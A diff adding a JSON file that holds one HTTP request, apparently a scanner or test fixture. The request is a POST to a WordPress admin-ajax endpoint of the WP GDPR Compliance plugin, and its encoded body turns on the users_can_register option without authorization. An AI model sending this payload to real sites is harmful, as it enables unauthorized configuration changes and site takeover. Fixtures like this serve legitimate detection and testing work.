@@ -1,0 +1,9 @@
+{
+  "body": "data=%7B%22type%22%3A%22save_setting%22%2C%22append%22%3Afalse%2C%22option%22%3A%22users_can_register%22%2C%22value%22%3A%221%22%7D",
+  "headers": {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  "host": "corp.com",
+  "method": "POST",
+  "path": "/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security=915c1bef91"
+}
